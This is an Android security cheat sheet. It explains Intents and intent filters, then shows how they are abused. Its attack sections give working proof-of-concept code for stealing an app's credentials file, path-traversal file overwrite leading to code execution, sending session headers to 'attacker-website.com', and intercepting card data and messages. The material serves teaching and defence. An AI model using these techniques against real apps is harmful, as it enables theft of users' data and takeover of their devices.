# Intent overview

An [Intent](https://developer.android.com/reference/android/content/Intent) provides a facility for performing late runtime binding between the code in different applications. In other words, an Intent allows you to request an action from another app component. Although Intents facilitate communication between components in several ways, there are three fundamental use cases:

- **Starting an [activity](https://developer.android.com/reference/android/app/Activity)**

    You can start a new instance of an Activity by passing an Intent to [startActivity()](https://developer.android.com/reference/android/content/Context#startActivity%28android.content.Intent%29). The Intent describes the activity to start and carries any necessary data. If you want to receive a result from the activity when it finishes, call [startActivityForResult()](https://developer.android.com/reference/android/app/Activity#startActivityForResult%28android.content.Intent,%20int%29).

- **Delivering a [broadcast](https://developer.android.com/guide/components/broadcasts)**

    The system delivers various broadcasts for system events, such as when the system boots up or the device starts charging. You can deliver a broadcast to other apps by passing an Intent to [sendBroadcast()](https://developer.android.com/reference/android/content/Context#sendBroadcast%28android.content.Intent%29) or [sendOrderedBroadcast()](https://developer.android.com/reference/android/content/Context#sendOrderedBroadcast%28android.content.Intent,%20java.lang.String%29).

- **Starting a [service](https://developer.android.com/reference/android/app/Service)**

    You can communicate with a background Service by passing an Intent to [Context.startService()](https://developer.android.com/reference/android/content/Context#startService%28android.content.Intent%29) or [Context.bindService()](https://developer.android.com/reference/android/content/Context#bindService%28android.content.Intent,%20android.content.ServiceConnection,%20int%29).

## Intent structure

The primary information contained in an Intent is the following:
- **Action** is a string that specifies the generic action to perform (such as view or pick). In the case of a broadcast intent, this is the action that took place and is being reported. It is possible to specify custom actions for use by intents within a app (or for use by other apps to invoke components in the app), but usually action constants are used (such as [ACTION_VIEW](https://developer.android.com/reference/android/content/Intent#ACTION_VIEW) or [ACTION_SEND](https://developer.android.com/reference/android/content/Intent#ACTION_SEND)) that defined by the Intent class or other framework classes.
- **Data** is the URI (a [Uri](https://developer.android.com/reference/android/net/Uri) object) that references the data to be acted on and/or the MIME type of that data. The type of data supplied is generally dictated by the intent's action. For example, if the action is [ACTION_EDIT](https://developer.android.com/reference/android/content/Intent#ACTION_EDIT), the data should contain the URI of the document to edit.
- **Component name** is the name of the component to start. If you need to start a specific component in your app, you should specify the component name.
- **Category** is a string containing additional information about the kind of component that should handle the intent (such as [CATEGORY_BROWSABLE](https://developer.android.com/reference/android/content/Intent#CATEGORY_BROWSABLE) or [CATEGORY_LAUNCHER](https://developer.android.com/reference/android/content/Intent#CATEGORY_LAUNCHER)).

{% hint style="info" %}
Component name, action, data, and category properties represent the defining characteristics of an intent. By reading these properties, the Android system is able to resolve which app component it should start.
{% endhint %}

An intent can carry additional information that does not affect how it is resolved to an app component. An intent can also supply the following information:
- **Extras** are key-value pairs that carry additional information required to accomplish the requested action. Just as some actions use particular kinds of data URIs, some actions also use particular extras.
- **Flags** are defined in the Intent class that function as metadata for the intent. The flags may instruct the Android system how to launch an activity (for example, which [task](https://developer.android.com/guide/components/activities/tasks-and-back-stack) the activity should belong to) and how to treat it after it's launched (for example, whether it belongs in the list of recent activities).

## Intent filter

An intent filter is an expression in an app's manifest file that specifies the type of intents that the component would like to receive. For instance, declaring an intent filter for an activity makes it possible for other apps to directly start the activity with a certain kind of intent. Likewise, an activity without any declared intent filters can be started only with an explicit intent.

Each intent filter is defined by an [&lt;intent-filter&gt;](https://developer.android.com/guide/topics/manifest/intent-filter-element) element in the app's manifest file, nested in the corresponding app component (such as an `<activity>` element). Inside the `<intent-filter>`, the type of intents to accept is specified using one or more of the following three elements:

- **[&lt;action&gt;](https://developer.android.com/guide/topics/manifest/action-element)** declares the intent action accepted, in the `name` attribute.
- **[&lt;data&gt;](https://developer.android.com/guide/topics/manifest/data-element)** declares the type of data accepted, using one or more attributes that specify various aspects of the data URI (`scheme`, `host`, `port`, `path`) and MIME type.
- **[&lt;category&gt;](https://developer.android.com/guide/topics/manifest/category-element)** declares the intent category accepted, in the name attribute.

{% hint style="info" %}
To receive implicit intents, it is necessary to include the [CATEGORY_DEFAULT](https://developer.android.com/reference/android/content/Intent#CATEGORY_DEFAULT) category in the intent filter. The methods `startActivity()` and `startActivityForResult()` treat all intents as if they declared the `CATEGORY_DEFAULT` category. If this category is not declared in the intent filter, no implicit intents will resolve to an activity.
{% endhint %}

For example, here's an activity declaration with an intent filter to receive an [ACTION_SEND](https://developer.android.com/reference/android/content/Intent#ACTION_SEND) intent when the data type is text:

```xml
<activity android:name="ShareActivity">
    <intent-filter>
        <action android:name="android.intent.action.SEND"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <data android:mimeType="text/plain"/>
    </intent-filter>
</activity>
```

{% hint style="info" %}
For all activities, it is necessary to declare intent filters in the manifest file. However, filters for broadcast receivers can be registered dynamically by calling [registerReceiver()](https://developer.android.com/reference/android/content/Context#registerReceiver%28android.content.BroadcastReceiver,%20android.content.IntentFilter,%20java.lang.String,%20android.os.Handler%29) and then unregistered with [unregisterReceiver()](https://developer.android.com/reference/android/content/Context#unregisterReceiver%28android.content.BroadcastReceiver%29). Doing so allows an app to listen for specific broadcasts during only a specified period of time while the app is running.
{% endhint %}

## Intent types

There are two types of intents:
- Explicit intents
- Implicit intents

### Explicit intents

Explicit intents specify which application will satisfy the intent, by supplying either the target app's package name or a fully-qualified component class name.

For example, if you built a service in your app, named `DownloadService`, designed to download a file from the web, you can start it with the following code:

```java
// Executed in an Activity, so 'this' is the Context
// The fileUrl is a string URL, such as "http://www.example.com/image.png"
Intent downloadIntent = new Intent(this, DownloadService.class);
downloadIntent.setData(Uri.parse(fileUrl));
startService(downloadIntent);
```

### Implicit intents

Implicit intents do not name a specific component, but instead declare a general action to perform, which allows a component from another app to handle it.

For example, if you have content that you want the user to share with other people, create an intent with the `ACTION_SEND` action and add extras that specify the content to share. When you call `startActivity()` with that intent, the user can pick an app through which to share the content.

```java
// Create the text message with a string.
Intent sendIntent = new Intent();
sendIntent.setAction(Intent.ACTION_SEND);
sendIntent.putExtra(Intent.EXTRA_TEXT, textMessage);
sendIntent.setType("text/plain");

// Try to invoke the intent.
try {
    startActivity(sendIntent);
} catch (ActivityNotFoundException e) {
    // Define what your app should do if no activity can handle the intent.
}
```

## Intent resolution

![](img/intent-filters.png)

An implicit intent is delivered through the system to start another activity as follows:

1. `Activity A` creates an Intent with an action description and passes it to `startActivity()`.
2. The `Android System` searches for the best activity for the intent by comparing it to intent filters based on three aspects: Action, data (both URI and data type) and category. The [page](https://developer.android.com/guide/components/intents-filters#Resolution) describes how intents are matched to the appropriate components according to the intent filter declaration in an app's manifest file.
3. When a match is found, the system starts the matching activity (`Activity B`) by invoking its `onCreate()` method and passing it the Intent.

If the `Android System` does not find any activity (across all apps) the [ActivityNotFoundException](https://developer.android.com/reference/android/content/ActivityNotFoundException) will be thrown.

If multiple intent filters are compatible the system will launch the App Chooser. It displays a dialog so the user can pick which app to use.

{% hint style="info" %}
You can control an app's position in the list using the `android:priority="num"` attribute within the intent filter
{% endhint %}

# Security issues

## Abusing an activity's return value

If an app launched an implicit intent using [startActivityForResult()](https://developer.android.com/reference/android/app/Activity#startActivityForResult%28android.content.Intent,%20int%29) an intercepting app can use [setResult()](https://developer.android.com/reference/android/app/Activity#setResult%28int,%20android.content.Intent%29) to pass data into the [onActivityResult()](https://developer.android.com/reference/android/app/Activity#onActivityResult%28int,%20int,%20android.content.Intent%29) of the app.

There are two types of such actions:
- **System action** which usually lead to reading of arbitrary files.
- **Custom actions** which can lead to different vulnerabilities that depend on app's implementation.

### Custom actions

Assume, an app expects a url in the data to open it in the WebView:

```java
startActivityForResult(new Intent("com.victim.PICK_ARTICLE"), 1);
```

```java
protected void onActivityResult(int requestCode, int resultCode, Intent data) {
    super.onActivityResult(requestCode, resultCode, data);
    if(requestCode == 1 && resultCode == -1) {
        webView.loadUrl(data.getStringExtra("picked_url"), getAuthHeaders());
    }
}
```

You can start to handle the `com.victim.PICK_ARTICLE` actions and pass an arbitrary url for opening in the WebView:

- `AndroidManifest.xml`

    ```xml
    <activity android:name=".EvilActivity">
        <intent-filter android:priority="999">
            <action android:name="com.victim.PICK_ARTICLE" />
            <category android:name="android.intent.category.DEFAULT" />
        </intent-filter>
    </activity>
    ```

- `EvilActivity.java`

    ```java
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setResult(-1, new Intent().putExtra("picked_url", "https://attacker-website.com/"));
        finish();
    }
    ```

### System actions

The standard Android actions such as:
- `android.intent.action.PICK` to choose a photo
- `android.intent.action.GET_CONTENT` to choose files
- `android.media.action.IMAGE_CAPTURE` to create a photo
- etc.

are used to obtain the URI of a file (document, image, video) selected by the user and to process it in an app (e.g. by sending it to a server). Most Android/Java libraries can't work with `InputStream` returned by Android `ContentResolver` to send data to a server. Therefore, apps very often cache URI data into a file before processing. This can lead to reading/writing of arbitrary files.

#### Arbitrary file reading

Assume, an app obtains a URI and caches a file to an external directory (for example, SD card), the vulnerable app could look as follows:

```java
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    startActivityForResult(new Intent(Intent.ACTION_PICK), 1337);
}
protected void onActivityResult(int requestCode, int resultCode, Intent data) {
    super.onActivityResult(requestCode, resultCode, data);
    if(requestCode != 1337 || resultCode != -1 || data == null || data.getData() == null) {
        return;
    }
    Uri pickedUri = data.getData();
    File cacheFile = new File(getExternalCacheDir(), "temp");
    copy(pickedUri, cacheFile);
    
    // the file is then processed in some way
}
private void copy(Uri uri, File toFile) {
    try {
        InputStream inputStream = getContentResolver().openInputStream(uri);
        OutputStream outputStream = new FileOutputStream(toFile);
        copy(inputStream, outputStream);
    }
    catch (Throwable th) {
        // error handling
    }
}
public static void copy(InputStream inputStream, OutputStream outputStream) throws IOException {
    byte[] bArr = new byte[65536];
    while (true) {
        int read = inputStream.read(bArr);
        if (read == -1) {
            break;
        }
        outputStream.write(bArr, 0, read);
    }
}
```

In this case you can create an app that will return a link to a file in a private directory of a targeted app:

- `AndroidManifest.xml`

    ```xml
    <activity android:name=".PickerActivity">
        <intent-filter android:priority="999">
            <action android:name="android.intent.action.PICK" />
            <category android:name="android.intent.category.DEFAULT" />
            <data android:mimeType="*/*" />
            <data android:mimeType="image/*" />
        </intent-filter>
    </activity>
    ```

- `PickerActivity.java`

    ```java
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setResult(-1, new Intent().setData(Uri.parse("file:///data/data/com.victim/databases/credentials")));
        finish();
    }
    ```

When a victim clicks on the attacker's app in the activity picker list, the `/data/data/com.victim/databases/credentials` file is automatically copied to SD card and can be read by any app with the `android.permission.READ_EXTERNAL_STORAGE` permission.

#### Arbitrary file writing

Assume, an app obtains the `content` URI and caches files from a ContentProvider to a temporary directory, the vulnerable app could look as follows:

```java
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    startActivityForResult(new Intent(Intent.ACTION_PICK), 1337);
}
protected void onActivityResult(int requestCode, int resultCode, Intent data) {
    super.onActivityResult(requestCode, resultCode, data);
    if(requestCode != 1337 || resultCode != -1 || data == null || data.getData() == null) {
        return;
    }
    Uri pickedUri = data.getData();
    File pickedFile;
    if("file".equals(pickedUri.getScheme())) {
        pickedFile = new File(pickedUri.getPath());
    }
    else if("content".equals(pickedUri.getScheme())) {
        pickedFile = new File(getCacheDir(), getFileName(pickedUri));
        copy(pickedUri, pickedFile);
    }
    // do something with the file
}
private String getFileName(Uri pickedUri) {
    Cursor cursor = getContentResolver().query(pickedUri, new String[]{MediaStore.MediaColumns.DISPLAY_NAME}, null, null, null);
    if(cursor != null && cursor.moveToFirst()) {
        String displayName = cursor.getString(cursor.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME));
        if(displayName != null) {
            return displayName;
        }
    }
    return "temp";
}
private void copy(Uri uri, File toFile) {
    try {
        InputStream inputStream = getContentResolver().openInputStream(uri);
        OutputStream outputStream = new FileOutputStream(toFile);
        copy(inputStream, outputStream);
    }
    catch (Throwable th) {
        // error handling
    }
}
public static void copy(InputStream inputStream, OutputStream outputStream) throws IOException {
    byte[] bArr = new byte[65536];
    while (true) {
        int read = inputStream.read(bArr);
        if (read == -1) {
            break;
        }
        outputStream.write(bArr, 0, read);
    }
}
```

In this case, you can pass a name with path-traversal to the `getFileName()` method using your own ContentProvider:

- `AndroidManifest.xml`

    ```xml
    <activity android:name=".PickerActivity">
        <intent-filter android:priority="999">
            <action android:name="android.intent.action.PICK" />
            <category android:name="android.intent.category.DEFAULT" />
            <data android:mimeType="*/*" />
            <data android:mimeType="image/*" />
        </intent-filter>
    </activity>
    <provider android:name=".EvilContentProvider" 
        android:authorities="com.attacker.evil"
        android:enabled="true"
        android:exported="true">
    </provider>
    ```

- `EvilContentProvider.java`

    ```java
    public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
        MatrixCursor matrixCursor = new MatrixCursor(new String[]{"_display_name"});
        matrixCursor.addRow(new Object[]{"../lib-main/lib.so"});
        return matrixCursor;
    }
    public ParcelFileDescriptor openFile(Uri uri, String mode) throws FileNotFoundException {
        return ParcelFileDescriptor.open(
            new File("/data/data/com.attacker/fakelib.so"), 
            ParcelFileDescriptor.MODE_READ_ONLY
        );
    }
    ```

This allows you to bypass the borders of the `/data/data/com.victim/cache/` directory and write the file to the `/data/data/com.victim/lib-main/lib.so`. If the targeted app loads this native library, this leads to arbitrary code execution in the victim's context.

## Access arbitrary components

Since the Intent is `Parcelable`, objects belonging to this class can be passed as extra data to another intent. This can be used to create a proxy component (activity, broadcast receiver or service) that take an embedded intent and pass it to dangerous methods such as `startActivity()` or `sendBroadcast()`. As a result, you can force an app to start an unexported component that can't be started directly from another app, or grant yourself access to app's content providers.

For example, suppose, an app have an unexported activity that performs certain unsafe actions and an exported activity that is used as a proxy:

- `AndroidManifest.xml`

    ```xml
    <activity android:name=".ProxyActivity" android:exported="true" />
    <activity android:name=".AuthWebViewActivity" android:exported="false" />
    ```

- `ProxyActivity.java`

    ```java
    startActivity((Intent) getIntent().getParcelableExtra("extra_intent"));
    ```

- `AuthWebViewActivity.java`

    ```java
    webView.loadUrl(getIntent().getStringExtra("url"), getAuthHeaders());
    ```

In this example the `AuthWebViewActivity` passes the user authentication session to the URL obtained from the url parameter.

Export restrictions mean you can't directly access `AuthWebViewActivity` and a direct call throws the `java.lang.SecurityException` with the `Permission Denial: AuthWebViewActivity not exported from uid 1337` message:

```java
Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.AuthWebViewActivity");
intent.putExtra("url", "http://attacker-website.com/");
// throws java.lang.SecurityException
startActivity(intent);
```

However, you can force a victim to start `AuthWebViewActivity` on their own:

```java
Intent extra = new Intent();
extra.setClassName("com.victim", "com.victim.AuthWebViewActivity");
extra.putExtra("url", "http://attacker-website.com/");

Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.ProxyActivity");
intent.putExtra("extra_intent", extra);
startActivity(intent);
```

There are no security violations because the app has access to all of its own components. Therefore, it allows you to bypass the built-in restrictions of the Android.

By itself, starting hidden components does not have much security impact and requires abuse of the functionality of the hidden components:
- [Oversecured: Access to app protected components: Escalation of attacks via Content Providers](https://blog.oversecured.com/Android-Access-to-app-protected-components/#escalation-of-attacks-via-content-providers)
- [Oversecured: Access to app protected components: Attacks on Android File Provider](https://blog.oversecured.com/Android-Access-to-app-protected-components/#attacks-on-android-file-provider)
- [Oversecured: Gaining access to arbitrary* Content Providers](https://blog.oversecured.com/Gaining-access-to-arbitrary-Content-Providers/)

### Access arbitrary components via WebView

{% embed url="https://0xn3va.gitbook.io/cheat-sheets/android-application/webview-vulnerabilities#access-arbitrary-components" %}

### Bypass protection

Developers can implement a filtering of received intents and [explicitly set a component to handle the intent](https://developer.android.com/reference/android/content/Intent#setComponent%28android.content.ComponentName%29) to `null`:

```java
intent.setComponent(null);
```

In this case, you can bypass the app's explicit intent protection by specifying an unexported component via a [selector](https://developer.android.com/reference/android/content/Intent#setSelector%28android.content.Intent%29):

```java
Intent intent = new Intent();
intent.setSelector(new Intent().setClassName("com.victim", "com.victim.AuthWebViewActivity"));
intent.putExtra("url", "http://attacker-website.com/");
```

The selector will be used when trying to find entities that can handle the Intent, instead of the main contents of the Intent.

However, developers can explicitly set a selector to `null`:

```java
intent.setComponent(null);
intent.setSelector(null);
```

Even so, you can create an implicit intent to match the `intent-filter` of some unexported activity:

```xml
<activity android:name=".AuthWebViewActivity" android:exported="false">
    <intent-filter>
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
        <data android:scheme="victim" android:host="secure_handler" />
    </intent-filter>
</activity>
```

## Insecure activity launches

If an app uses implicit intents with certain private data to launch activities you can start to handle the same actions to intercept the private data. For example, suppose a banking app uses an implicit intent with card data to launch an activity:

```xml
<activity android:name=".AddCardActivity">
    <intent-filter>
        <action android:name="com.victim.ADD_CARD_ACTION" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
</activity>
```

```java
Intent intent = new Intent("com.victim.ADD_CARD_ACTION");
intent.putExtra("credit_card_number", num.getText().toString());
intent.putExtra("holder_name", name.getText().toString());
// ...
startActivity(intent);
```

You can intercept card data as follows:

- `AndroidManifest.xml`

    ```xml
    <activity android:name=".EvilActivity">
        <intent-filter android:priority="999">
            <action android:name="com.victim.ADD_CARD_ACTION" />
            <category android:name="android.intent.category.DEFAULT" />
        </intent-filter>
    </activity>
    ```

- `EvilActivity.java`

    ```java
    Log.d("d", "Number: " + getIntent().getStringExtra("credit_card_number"));
    Log.d("d", "Holder: " + getIntent().getStringExtra("holder_name"));
    // ...
    ```

## Insecure broadcasts

If an app uses implicit intents to deliver a broadcast you can register a broadcast receiver with the same action and intercept a user's broadcast from a different app. For example, suppose a messaging service requests new messages from the server and passes them to a broadcast receiver that is responsible for displaying them on the user's screen:

```java
Intent intent = new Intent("com.victim.messenger.IN_APP_MESSAGE");
intent.putExtra("from", id);
intent.putExtra("text", text);
sendBroadcast(intent);
```

Since implicit broadcasts are delivered to each receiver registered on the device, across all apps, you can register the following broadcast receiver to intercept a user's broadcast:

- `AndroidManifest.xml`

    ```xml
    <receiver android:name=".EvilReceiver">
        <intent-filter>
            <action android:name="com.victim.messenger.IN_APP_MESSAGE" />
        </intent-filter>
    </receiver>
    ```

- `EvilReceiver.java`

    ```java
    public class EvilReceiver extends BroadcastReceiver {
        public void onReceive(Context context, Intent intent) {
            if ("com.victim.messenger.IN_APP_MESSAGE".equals(intent.getAction())) {
                // log intercepted data
                Log.d("d", "From: " + intent.getStringExtra("from"));
                Log.d("d", "Text: " + intent.getStringExtra("text"));
            }
        }
    }
    ```

# References

- [Android Developers: Intents and Intent Filters](https://developer.android.com/guide/components/intents-filters)
- [Oversecured: Interception of Android implicit intents](https://blog.oversecured.com/Interception-of-Android-implicit-intents/)
- [Oversecured: Android Access to app protected components](https://blog.oversecured.com/Android-Access-to-app-protected-components/)
